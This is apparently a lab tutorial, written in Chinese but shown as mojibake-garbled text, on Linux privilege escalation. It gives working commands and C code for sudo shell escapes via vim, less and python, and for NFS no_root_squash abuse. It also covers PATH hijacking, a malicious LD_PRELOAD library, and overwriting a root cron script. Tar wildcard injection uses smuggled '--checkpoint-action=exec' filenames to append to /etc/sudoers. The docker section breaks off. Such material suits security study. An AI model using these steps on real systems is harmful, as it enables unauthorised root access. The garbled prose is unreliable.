ç­‰å®‰å…¨è®¾ç½®ã€‚ç¼–è¾‘sudoersæ–‡ä»¶éœ€è¦ç‰¹æ®Šçš„æƒé™ï¼Œå¹¶ä¸”é€šå¸¸ä½¿ç”¨visudoå‘½ä»¤æ¥è¿›è¡Œç¼–è¾‘ï¼Œä»¥ç¡®ä¿åœ¨ä¿å­˜æ–‡ä»¶æ—¶èƒ½å¤Ÿæ£€æŸ¥è¯­æ³•é”™è¯¯ï¼Œä»¥é¿å…å¯¼è‡´ç³»ç»Ÿå®‰å…¨æ€§é—®é¢˜ã€‚ å‡å¦‚æˆ‘ä»¬ï¼ˆrootç”¨æˆ·ï¼‰è¦ç»™æ™®é€šç”¨æˆ·teståˆ†é…sudoæƒé™ï¼Œè¯·è¾“å‡ºvim /etc/sudoersæ‰“å¼€æ–‡ä»¶è¿›è¡Œç¼–è¾‘ï¼Œæ‰¾åˆ°rootæƒé™root ALL=(ALL:ALL) ALLï¼Œåœ¨ä¸‹ä¸€è¡Œè¾“å…¥test ALL(ALL:ALL) NOPASSWD:ALLï¼Œä¿å­˜åé€€å‡ºï¼Œè¿™æ ·å³è¡¨ç¤ºç”¨æˆ·testå¯ä»¥ä½¿ç”¨sudoè°ƒç”¨rootæƒé™æ‰§è¡Œå‘½ä»¤ã€‚ /etc/sudoersä¹Ÿå¯ä»¥æŒ‡å®šç”¨æˆ·æ‰§è¡ŒæŒ‡å®šçš„sudoå‘½ä»¤ test ALL(ALL:ALL) /usr/bin/ls,ä½†æ˜¯è¿™æ ·è¿˜æ˜¯å¾—è¾“å…¥å¯†ç æ‰èƒ½æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥é…ç½®ä¸éœ€è¦å¯†ç ï¼štest ALL(ALL:ALL) NOPASSWD:/usr/bin/ls, åœ¨Vimä¸­ï¼Œå½“ä½ è¾“å…¥:!/bin/bashå¹¶æŒ‰ä¸‹å›è½¦æ—¶ï¼ŒVimä¼šæ‰§è¡Œä½ è¾“å…¥çš„å‘½ä»¤ï¼Œå…¶ä¸­!è¡¨ç¤ºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤çš„æ„æ€ã€‚å› æ­¤ï¼ŒVimä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„shellè¿›ç¨‹å¹¶æ‰§è¡Œ/bin/bashã€‚è¿™æ˜¯Vimçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·åœ¨ç¼–è¾‘å™¨ä¸­æ‰§è¡Œå¤–éƒ¨å‘½ä»¤,å½“ç„¶vimï¼Œåªæ˜¯sudoææƒå‘½ä»¤ä¹‹ä¸€ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„å‘½ä»¤ï¼Œæ¯”å¦‚ï¼šless,pythonç­‰ç­‰ï¼Œå¯ä»¥å‚è€ƒä¸Šé¢é‚£ä¸ªç½‘ç«™ 12345678910111213141516171819202122232425262728293031â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ sudo vim /etc/sudoers#æ·»åŠ zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/less# wp!ä¿å­˜é€€å‡ºâ”Œâ”€â”€(zixydã‰¿kali)-[/home/kali/æ¡Œé¢]â””â”€$ sudo -llåŒ¹é… kali ä¸Š zixyd çš„é»˜è®¤æ¡ç›®ï¼š env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyç”¨æˆ· zixyd å¯ä»¥åœ¨ kali ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼šSudoers æ¡ç›®ï¼š RunAs ç”¨æˆ·ï¼šALL RunAs ç»„ï¼šALL é€‰é¡¹ï¼š!authenticate å‘½ä»¤ï¼š /usr/bin/less#åˆ‡æ¢åˆ°zixydç”¨æˆ·â”Œâ”€â”€(zixydã‰¿kali)-[/home/kali/æ¡Œé¢]â””â”€$ sudo less /etc/passwd#ç›´æ¥è¾“å…¥!/bin/bash#ææƒæˆåŠŸâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢]â””â”€# å†è¯•è¯•python,åœ¨/etc/sudoersä¸­æ·»åŠ zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/less,/usr/bin/python, 12345â”Œâ”€â”€(zixydã‰¿kali)-[/home/kali/æ¡Œé¢]â””â”€$ sudo python -c &quot;import os;os.system('/bin/sh')&quot;# whoami root NFSææƒNFSæ˜¯network file systemç¼©å†™ï¼Œç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨æ¥æŒ‚åœ¨æŸä¸ªç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå…±äº«ï¼Œé»˜è®¤æ˜¯2049ç«¯å£ï¼ŒåŠŸèƒ½ç±»ä¼¼äºwindowsçš„å…±äº«ã€‚ é¦–å…ˆå®‰è£…nfsæœåŠ¡ç«¯ï¼š 1sudo apt-get install nfs-kernel-server å®‰è£…åä¿®æ”¹é…ç½®æ–‡ä»¶/etc/exportsï¼Œè¿™é‡Œå°†homeç›®å½•è¿›è¡ŒæŒ‚è½½å…±äº«ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 1/home *(rw,no_root_squash) å…¶ä¸­/homeæ˜¯è¦æŒ‚è½½çš„ç›®å½•ï¼Œ*ä»£è¡¨å…è®¸è¿æ¥çš„ä¸»æœºï¼Œè¿™é‡Œæ˜¯æ‰€æœ‰ï¼Œrwæ˜¯è¯»å†™æƒé™ï¼Œno_root_squashä»£è¡¨å®¢æˆ·ç«¯å…è®¸ä»¥rootæƒé™è®¿é—®nfsã€‚ éšåé‡å¯ç›¸å…³æœåŠ¡ï¼š 123# nfsé€šè¿‡rpcé€šä¿¡ï¼Œè¿™é‡ŒæŠŠrpcbindä¹Ÿé‡å¯ä¸‹sudo /etc/init.d/rpcbind restartsudo /etc/init.d/nfs-kernel-server restart æ­¤æ—¶å°±é…ç½®å¥½äº†ï¼Œå¯ä»¥é€šè¿‡showmountå‘½ä»¤æ¥åˆ—å‡ºç›®æ ‡æœºçš„å…±äº«ç›®å½•ï¼Œeå‚æ•°æ˜¾ç¤ºNFSæœåŠ¡å™¨çš„è¾“å‡ºæ¸…å•ã€‚ 1showmount -e ip NFSé…ç½®ä¸å½“å¯ææƒ å½“nfsé…ç½®äº†è¯»å†™æƒé™ï¼Œä¸”å…è®¸å®¢æˆ·ç«¯ä»¥rootè®¿é—®æ—¶ï¼Œå°±ä¼šå­˜åœ¨å®‰å…¨éšæ‚£ã€‚æµ‹è¯•å¦‚ä¸‹ï¼š é¦–å…ˆå®¢æˆ·ç«¯æŠŠç›®æ ‡æœºnfsçš„å…±äº«æŒ‚è½½åˆ°æœ¬åœ°ï¼Œç„¶åæŠŠbashå¤åˆ¶è¿›å»å¹¶èµ‹äºˆsuidæƒé™ï¼Œæ“ä½œå¦‚ä¸‹å›¾ã€‚ æ­¤æ—¶ç›®æ ‡æœºçš„homeç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªå…·æœ‰suidæƒé™çš„bashã€‚ æ™®é€šç”¨æˆ·æ‰§è¡Œå³å¯è·å–rootæƒé™ï¼Œè¿™é‡Œæ³¨æ„éœ€è¦åŠ ä¸Špå‚æ•°ï¼Œå¦åˆ™æƒé™è¿˜æ˜¯å½“å‰ç”¨æˆ·çš„ã€‚ på‚æ•°è¯´æ˜ï¼šä¸æä¾›çš„æƒ…å†µä¸‹ï¼Œæ‰“å¼€bashæƒé™æ˜¯å½“å‰å®é™…ç”¨æˆ·ï¼Œæä¾›çš„æƒ…å†µä¸‹ï¼Œä¼šæ‰“å¼€ç‰¹æƒæ¨¡å¼ï¼Œåƒä¸Šç»§æ‰¿euidï¼Œå› ä¸ºbashæœ‰suidæƒé™ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯rootã€‚ ä½¿ç”¨åœºæ™¯ï¼šè¿™ä¸ªå’Œsuidææƒå¾ˆåƒï¼Œç»™ç¨‹åºèµ‹äºˆsuidæƒé™ç„¶ååˆ©ç”¨ã€‚ä¸åŒçš„æ˜¯å‰ä¸¤ç¯‡suidææƒæ˜¯å½“å‰ç”¨æˆ·ä½¿ç”¨sudo chmodè‡ªå·±ä¿®æ”¹çš„ï¼Œåœ¨sudoersç¦ç”¨sudoå‘½ä»¤ç­‰æƒ…å†µä¸‹ï¼Œå°±è¡Œä¸é€šäº†ã€‚è€Œnfsé…ç½®åˆ©ç”¨ï¼Œæ˜¯å®¢æˆ·ç«¯æŒ‚è½½åˆ°æœ¬åœ°èµ‹æƒçš„ï¼Œç›®æ ‡æœºçš„æ™®é€šç”¨æˆ·åªéœ€æ‰§è¡Œå°±å¯ä»¥ã€‚ å…¶å®ƒå‘½ä»¤ é™¤äº†å¯ä»¥ç›´æ¥å¾—åˆ°shellçš„ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç¨‹åºä¸èƒ½ç›´æ¥è·å–ï¼Œä¾‹å¦‚nanoã€viç­‰ã€‚ ä¾‹å¦‚nanoè¢«å…±äº«äº†ï¼Œåˆ™å¯ä»¥ç»™nanoä¸€ä¸ªsuidæƒé™ï¼Œç„¶åæ¥è¯»å–æ•æ„Ÿæ–‡ä»¶ï¼Œçˆ†ç ´å¯†ç ä»è€Œç™»å½•ã€‚ PATHææƒLinuxä¸­çš„PATHæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒæŒ‡å®šäº†å¯æ‰§è¡Œç¨‹åºæ‰€åœ¨çš„ç›®å½•ï¼Œä¾‹å¦‚binå’Œsbinç›®å½•ï¼Œå½“æˆ‘ä»¬åœ¨ç»ˆç«¯è¿è¡Œä¸€ä¸ªå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæ ¹æ®PATHæ¥æŸ¥æ‰¾ç›¸å…³çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ é¦–å…ˆç¼–è¯‘ä»¥ä¸‹cä»£ç ï¼Œè¿™é‡Œç”¨whoamiå‘½ä»¤æ¥åšå®éªŒ,gcc shell.c -o whoami_shell 123456789#include&lt;unistd.h&gt;#include&lt;stdlib.h&gt;int main(){ setuid(0); setgid(0); system(&quot;whoami&quot;); return 0;} 12345678910111213141516171819202122â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ gcc ./shell.c -o whoami_shell â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ ls -l ./whoami_shell-rwxr-xr-x 1 kali kali 16056 12æœˆ 7æ—¥ 19:19 ./whoami_shellâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ ./whoami_shell kaliâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ sudo chown root ./whoami_shell #æ”¹å˜æ‰€æœ‰è€…ä¸ºroot â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ ll whoami_shell -rwxr-xr-x 1 root kali 16056 12æœˆ 7æ—¥ 19:19 whoami_shellâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ sudo chmod u+s ./whoami_shell â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ ./whoami_shellroot åˆ©ç”¨ï¼šåˆ°tmpç›®å½•ä¸‹ï¼ŒæŠŠbashå†™åˆ°ä¸€ä¸ªwhoamiæ–‡ä»¶ä¸­ï¼Œç„¶åä¿®æ”¹PATHå˜é‡æ·»åŠ tmpç›®å½•ï¼Œå†å»æ‰§è¡Œshellï¼Œå°±ä¼šè·å¾—ä¸€ä¸ªrootæƒé™ã€‚ 1234567891011121314151617181920212223242526272829â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ cd /tmp â”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ echo &quot;/bin/bash&quot; &gt; whoamiâ”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ ls whoamiâ”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/binâ”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ export PATH=/tmp:$PATHâ”Œâ”€â”€(kaliã‰¿kali)-[/tmp]â””â”€$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/binâ”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ chmod +x /tmp/whoami #è¿˜è¦ç»™å¯æ‰§è¡Œæƒé™â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ ./whoami_shell â”Œâ”€â”€(rootã‰¿kali)-[~/æ¡Œé¢]â””â”€# è¿‡ç¨‹ï¼šrootç»™ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶èµ‹äºˆäº†suidï¼Œè€Œæ­¤æ–‡ä»¶åˆè°ƒç”¨äº†ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å‘½ä»¤ï¼Œè¿™æ—¶ä¿®æ”¹PATHæŠŠtmpæ·»åŠ åˆ°å¤´çš„ä½ç½®ï¼Œç³»ç»Ÿå†æ‰§è¡Œå°±ä¼šå…ˆå»tmpç›®å½•ä¸‹æ‰¾ï¼Œtmpç›®å½•ä¸‹æ”¾çš„æ˜¯æ¶æ„ç¨‹åºï¼Œä»è€Œå¯¼è‡´æ¶æ„ç¨‹åºä»¥rootæƒé™è¿è¡Œã€‚ æ³¨æ„ï¼Œç”¨export PATH=/tmp:$PATHæ”¹å˜PATHåªåœ¨æ­¤æ¬¡ç»ˆç«¯æ‰æœ‰æ•ˆï¼Œå¯¹å…¶ä»–ç»ˆç«¯æ— æ•ˆ LD_PRELOADææƒLD_PRELOADæ˜¯Linuxä¸‹çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç¨‹åºè¿è¡Œæ—¶éƒ½ä¼šåŠ è½½ä¸€äº›soæ–‡ä»¶ï¼Œç±»ä¼¼äºwindowsä¸‹ç¨‹åºåŠ è½½dllï¼Œè€ŒLD_PRELOADå¯ä»¥æŒ‡å®šç¨‹åºè¿è¡Œå‰åŠ è½½çš„åŠ¨æ€è¿æ¥åº“ã€‚ æµ‹è¯•å‰å…ˆæŒ‰å¦‚ä¸‹é…ç½®ä¸€ä¸‹sudoersæ–‡ä»¶ï¼Œä»¥zixydç”¨æˆ·ä¸ºä¾‹ï¼Œæ·»åŠ ä¸€ä¸ªfindå‘½ä»¤å’Œä¸€ä¸ªLD_PRELOADã€‚ 123zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/findDefaults env_keep += LD_PRELOAD è¿™é‡Œè®°å½•ä¸‹env_keepçš„è¯´æ˜ã€‚ ä¾‹å¦‚aaaç”¨æˆ·æœ‰ä¸€ä¸ªaaa_pachçš„ç¯å¢ƒå˜é‡ï¼Œå½“é€šè¿‡suåˆ‡æ¢åˆ°bbbç”¨æˆ·æ—¶ï¼Œå†æŸ¥çœ‹envç¯å¢ƒå˜é‡ï¼Œaaa_pachå°±æ²¡æœ‰äº†ï¼Œä¹Ÿå°±æ„å‘³ç€ç”¨æˆ·çš„åˆ‡æ¢ä¸ä¼šå¸¦ç€ç¯å¢ƒå˜é‡ä¸€å—åˆ‡è¿‡å»ã€‚è€Œæƒ³ä¿æŒæŸä¸ªç¯å¢ƒä¸å—ç”¨æˆ·åˆ‡æ¢çš„å½±å“ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨sudoersæ–‡ä»¶ä¸­è®¾ç½®env_keepã€‚ å¦‚æœå¹¶è®¾ç½®Defaults env_keep += LD_PRELOAD,ä¼šæŠ¥é”™ 123â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ sudo LD_PRELOAD=ld_preload_shell_test find sudo: å¯¹ä¸èµ·ï¼Œæ‚¨æ— æƒè®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼šLD_PRELOAD åˆ‡æ¢å›æ™®é€šç”¨æˆ·ï¼ŒæŸ¥çœ‹sudoæƒé™ã€‚ 1234567â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ sudo -l åŒ¹é… kali ä¸Š zixyd çš„é»˜è®¤æ¡ç›®ï¼š env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=LD_PRELOAD, use_ptyç”¨æˆ· zixyd å¯ä»¥åœ¨ kali ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š (ALL : ALL) NOPASSWD: /usr/bin/find æˆ‘ä»¬æœ‰ä¸€ä¸ªfindçš„sudoæƒï¼Œä¸”env_keepä¸­å®šä¹‰äº†LD_PRELOADï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®šä¹‰ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶ï¼Œç„¶åsudoè¿è¡Œfindæ—¶æŒ‡å®šLD_PRELOADæ¥åŠ è½½æˆ‘ä»¬è‡ªå·±çš„soæ–‡ä»¶ï¼Œå°±å¯ä»¥å®ç°ææƒã€‚ soæ–‡ä»¶çš„cä»£ç å¦‚ä¸‹ã€‚ 12345678910#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;);} ç„¶åè¿›è¡Œç¼–è¯‘-fPIC -sharedå‚æ•°ç®€å•ç†è§£å°±æ˜¯åŠ¨æ€ç¼–è¾‘å…±äº«åº“ï¼Œå¯ä»¥è¿›è¡Œå…¬å…±è°ƒç”¨ï¼Œnostartfileså‚æ•°ä»£è¡¨è¯¥åº“è¿è¡Œä¸ä¼šå»è°ƒç”¨ç³»ç»Ÿçš„å…¶å®ƒåº“ï¼Œé¿å…å½±å“è‡ªå·±çš„ç¨‹åºæ‰§è¡Œã€‚ 1gcc ld_preload_shell.c -fPIC -shared -o shell.so -nostartfiles ç¼–è¯‘åæˆ‘ä»¬ä½¿ç”¨sudoè¿è¡Œfindå¹¶æŒ‡å®šLD_PRELOADä¸ºæˆ‘ä»¬ç¼–è¯‘çš„shell.soæ–‡ä»¶ï¼Œè¿™æ—¶findå°±ä¼šå…ˆè°ƒç”¨shell.soï¼Œå¯¼è‡´æˆ‘ä»¬çš„ä»£ç è¢«æ‰§è¡Œï¼Œè¿”å›çš„æƒé™ä¸ºrootã€‚ 1234â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ sudo LD_PRELOAD=/home/zixyd/shell.so find #ä¼¼ä¹åªèƒ½ç”¨ç»å¯¹è·¯å¾„ï¼Œç³»ç»Ÿé»˜è®¤çš„å…±äº«åº“ç›®å½•ï¼ˆæ¯”å¦‚/libå’Œ/usr/libï¼‰ â”Œâ”€â”€(rootã‰¿kali)-[/home/zixyd]â””â”€# æ€è€ƒï¼š å†sudoææƒæ—¶å¯ä»¥ç”¨åˆ°LD_PRELOADï¼Œé‚£ä¹ˆsuidè¡Œä¸è¡Œå‘¢ï¼Ÿæˆ‘ç”¨suidæ²¡æœ‰æˆåŠŸ 123456789â”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ ll /usr/bin/cp-rwsr-xr-x 1 root root 151152 2022å¹´ 9æœˆ20æ—¥ /usr/bin/cpâ”Œâ”€â”€(zixydã‰¿kali)-[~]â””â”€$ LD_PRELOAD=/home/zixyd/shell.so cp /etc/passwd ./â”Œâ”€â”€(zixydã‰¿kali)-[~] #å¹¶æ²¡æœ‰åˆ‡æ¢åˆ°rootâ””â”€$ æ³¨æ„ç‚¹ï¼šå¦‚æœä½¿ç”¨è‡ªå·±æ”»å‡»æœºç¼–è¯‘çš„soæ–‡ä»¶ï¼Œä¼ åˆ°ç›®æ ‡æœºå¯èƒ½æ™®é€šç”¨æˆ·æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œè¿™æ—¶éœ€è¦åŠ ä¸‹æƒé™ã€‚å¦‚æœç›®æ ‡æœºæ”¯æŒgccç¼–è¯‘ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨ç›®æ ‡æœºç¼–è¯‘ã€‚ æ€»ç»“ ä½¿ç”¨æƒ…å†µå°±æ˜¯sudoersä¸­çš„env_keepå®šä¹‰äº†LD_PRELOADï¼Œç„¶åsudoæœ‰ç›¸å…³çš„å‘½ä»¤ï¼Œé‚£ä¹ˆsudoè¿è¡Œå‘½ä»¤æ—¶å°±å¯ä»¥é€šè¿‡LD_PRELOADæ¥æŒ‡å®šæ¶æ„soæ–‡ä»¶ã€‚ cronjobsææƒcronjobsæ˜¯å®šæ—¶ä»»åŠ¡ï¼Œåœ¨ç‰¹å®šçš„æ—¥æœŸå’Œæ—¶é—´æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ã€‚ä¾‹å¦‚å®šæœŸå¤‡ä»½æˆ–è€…å®šæœŸæ¸…ç†æŸä¸ªç›®å½•ç­‰éƒ½ä¼šç”¨åˆ°ï¼Œå®šä¹‰æ ¼å¼å¦‚ä¸‹ï¼š æ–‡ä»¶è¦†ç›–è¿™é‡Œä»¥rootç”¨æˆ·åˆ›å»ºä¸€ä¸‹æµ‹è¯•ç¯å¢ƒï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªcronï¼Œè¿è¡Œä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬åŠŸèƒ½æ˜¯å®šæ—¶æ¸…é™¤ç‰¹å®šæ–‡ä»¶ï¼Œä¾‹å¦‚/tmp/testã€‚ 12â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ echo &quot;just_test&quot; &gt; /tmp/test åˆ›å»ºclear.pyè„šæœ¬ï¼Œå¹¶èµ‹å¯æ‰§è¡Œæƒé™chmod +x /tmp/clear.py 12345678#!/usr/bin/env python3import osimport systry: os.system(&quot;rm -rf /tmp/test&quot;)except: sys.exit() ä¿®æ”¹crontab æ–‡ä»¶ï¼Œæ¯åˆ†é’Ÿä»¥rootèº«ä»½æ‰§è¡Œä¸€æ¬¡/tmp/clear.pyæ–‡ä»¶ 123sudo vim /etc/crontab */1 * * * * root /tmp/clear.py ææƒï¼š å¦‚æœå¯ä»¥ä¿®æ”¹å®šæ—¶ä»»åŠ¡çš„æ–‡ä»¶(clear.py)ï¼Œå°±å¯ä»¥ææƒï¼Œä¾‹å¦‚å°†ä¸Šé¢çš„**/tmp/clear.py**ä¿®æ”¹å†…å®¹å¦‚ä¸‹ 123456789#!/usr/bin/env python3import osimport systry: os.system(&quot;rm -rf /tmp/test&quot;) os.system(&quot;chmod u+s /bin/bash&quot;)except: sys.exit() åœ¨æ‰§è¡Œ/bin/bash -på‘½ä»¤å³å¯å¾—åˆ°rootæƒé™ï¼Œ-på‚æ•°åœ¨æœ¬æ–‡ç« ä¸Šé¢æœ‰è§£é‡Šï¼› é€šé…ç¬¦æ³¨å…¥è€Œåœ¨æ“ä½œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæœ‰æ–‡ä»¶åçš„åå­—æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè¢«å½“ä½œå‚æ•°è¿è¡Œã€‚ä¾‹å¦‚ä¸€ä¸ªç›®å½•ä¸‹æœ‰ä¸€ä¸ªå«â€“helpçš„æ–‡ä»¶ï¼Œå½“catæŸ¥çœ‹è¯¥æ–‡ä»¶å†…å®¹æ—¶ï¼Œå®é™…ä¸Šç¡®æ˜¯catçš„å¸®åŠ©ä¿¡æ¯ã€‚ å¸¸è§çš„å®šæ—¶ä»»åŠ¡é™¤äº†å®šæ—¶æ¸…é™¤æ–‡ä»¶å¤–ï¼Œå®šæ—¶å‹ç¼©ä¹Ÿä¼šå¾ˆå¸¸è§ï¼Œä¾‹å¦‚æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿå›å»æ‰§è¡Œ/var/www/html/crontab.shè„šæœ¬ï¼Œè¯¥è„šæœ¬æ˜¯å¤‡ä»½htmlç½‘ç«™ï¼Œè„šæœ¬å†…å®¹å¦‚ä¸‹ã€‚ 123#!/bin/bashcd /var/www/html/tar -zvcf /var/backups/html.tar * ä¿®æ”¹/etc/crontabï¼š 1*/1 * * * * root /var/www/html/crontab.sh æŸ¥çœ‹æ˜¯å¦å¤‡ä»½æˆåŠŸ 1234567â”Œâ”€â”€(kaliã‰¿kali)-[/var/backups]â””â”€$ cd /var/backups â”Œâ”€â”€(kaliã‰¿kali)-[/var/backups]â””â”€$ llæ€»è®¡ 4-rw-r--r-- 1 root root 3621 12æœˆ 8æ—¥ 09:52 html.tar åœ¨tarå‘½ä»¤ä¸­æœ‰ä¸€ä¸ªcheckpointå‚æ•°ï¼Œå³æ£€æŸ¥ç‚¹ï¼Œæ¯”å¦‚checkpoint=1ï¼Œåˆ™ä»£è¡¨å‹ç¼©è¿‡ç¨‹ä¸­æ¯å‹ç¼©ä¸€ä¸ªæ–‡ä»¶å°±å»æ‰§è¡Œä¸€ä¸ªæ£€æŸ¥æ“ä½œã€‚ è€Œè¿™ä¸ªæ£€æŸ¥æ“ä½œçš„å‚æ•°æ˜¯--checkpoint-action=exec=ï¼Œåé¢å¯ä»¥è·Ÿè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ åˆ©ç”¨æ€è·¯å°±æ˜¯æˆ‘ä»¬å†™å…¥ä¸€ä¸ªshè„šæœ¬ï¼Œè¯¥è„šæœ¬ä½œç”¨æ˜¯ä¿®æ”¹sudoersæ–‡ä»¶ï¼ŒæŠŠå½“å‰ç”¨æˆ·æ·»åŠ è¿›å»ï¼Œè·å¾—sudoæ‰€æœ‰æƒï¼Œä»è€Œè¿›è¡Œææƒã€‚ç„¶ååˆ©ç”¨checkpoint-action=exec=æ¥ä¸€ä¸ªæ‰§è¡Œshè„šæœ¬çš„å‘½ä»¤å³å¯ã€‚ åˆ©ç”¨è¿‡ç¨‹ï¼šé¦–å…ˆåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œåå­—ä¸ºå‚æ•°åï¼Œç„¶åå†åˆ›å»ºä¸€ä¸ªshè„šæœ¬ï¼Œå†…å®¹ä¸ºå‘sudoersè¿½åŠ æƒé™ï¼Œç›¸å…³å‘½ä»¤å¦‚ä¸‹ï¼š 123echo 'echo &quot;zixyd ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers' &gt; test.shecho &quot;&quot; &gt; --checkpoint=1echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot; ç­‰å¾…ä¸€åˆ†é’Ÿåï¼Œsudoerså°±ä¼šè¢«è¿½åŠ zixydç”¨æˆ·çš„æƒé™ 123456sudo cat /etc/sudoers#æ¯åˆ†é’Ÿ éƒ½ä¼šå¾€/etc/sudoersæ·»åŠ ä¸€å¥zixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALL dockerææƒåœ¨dockerä¸­ï¼Œæ˜¯å…è®¸è®¿é—®rootç”¨æˆ·å’Œdockerç»„ä¸­çš„å…¶å®ƒç”¨æˆ·çš„ï¼Œæµ‹è¯•å¦‚ä¸‹,(è¿™å¥è¯è¡¨è¾¾çš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯åªè¦ç”¨æˆ·åœ¨dockerç»„ä¸‹ï¼Œå°±å¯ä»¥æœªæˆæƒè®¿é—®rootç”¨æˆ·å’Œdockerç»„ä¸­çš„å…¶ä»–ç”¨æˆ·) éœ€è¦å°†ç”¨æˆ·æ·»åŠ åˆ°dockerç»„ä¸­ 1usermod -G docker kali è¿™é‡Œæœ‰æ„æ€çš„æ˜¯ï¼Œæˆ‘æ²¡æœ‰è¾“å…¥è¿™æ¡å‘½ä»¤ï¼Œæˆ‘åœ¨æˆ‘çš„kaliç”¨æˆ·å·²ç»æ˜¯dockrç»„äº†(æ„æ€å°±æ˜¯æˆ‘æ²¡æœ‰è®¾ç½®å®éªŒç¯å¢ƒï¼Œæˆ‘çš„kaliæœºå™¨å·²ç»å­˜åœ¨å¯ä»¥ææƒçš„ç‚¹äº†) ä¸Šç½‘æ‰¾åŸå› ï¼šåœ¨æŸäº›Linuxç³»ç»Ÿä¸­ï¼Œå®‰è£…Dockeråä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåä¸ºâ€dockerâ€çš„ç”¨æˆ·ç»„ï¼Œå¹¶å°†å½“å‰ç”¨æˆ·åŠ å…¥è¯¥ç»„ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥åœ¨ä¸ä½¿ç”¨sudoçš„æƒ…å†µä¸‹è¿è¡ŒDockerå‘½ä»¤ã€‚è¿™é€šå¸¸æ˜¯Dockerå®‰è£…è¿‡ç¨‹ä¸­çš„é»˜è®¤è¡Œä¸ºã€‚ 1234567â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ groups kalikali : kali adm dialout cdrom floppy sudo audio dip video plugdev users netdev wireshark bluetooth scanner kaboxer 